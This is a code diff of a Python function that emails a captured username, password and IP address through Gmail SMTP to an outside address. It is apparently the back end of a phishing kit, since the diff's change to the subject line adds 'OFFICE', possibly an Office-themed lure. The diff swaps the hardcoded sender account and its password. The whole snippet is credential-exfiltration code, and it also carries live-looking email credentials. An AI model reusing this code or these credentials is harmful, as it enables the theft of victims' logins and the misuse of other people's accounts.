@@ -17,8 +17,8 @@ def send_mail(username, password, ip_address):
     # msg["From"] = sender_email
     # msg["To"] = receiver_email
     #Send Email
-    EMAIL_ADDRESS = "work77@gmail.com"
-    EMAIL_PASSWORD = "softwork77"
+    EMAIL_ADDRESS = "busganda@gmail.com"
+    EMAIL_PASSWORD = "mkarxgucgtnvymys"
     with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
         smtp.ehlo()
         smtp.starttls()
@@ -26,10 +26,10 @@ def send_mail(username, password, ip_address):
 
         smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
 
-        subject = "Just Testing"
+        subject = "Just Testing OFFICE"
         body = f"The username is: {username} \n password is: {password} \n ip: {ip_address}"
         msg = f"Subject: {subject}\n\n{body}"
-        smtp.sendmail("work77@gmail.com", "chibyx395@gmail.com", msg)
+        smtp.sendmail("busganda@gmail.com", "chibyx395@gmail.com", msg)
 
     # with smtplib.SMTP(smtp_server, port) as server:
     #     server.login(login, password)
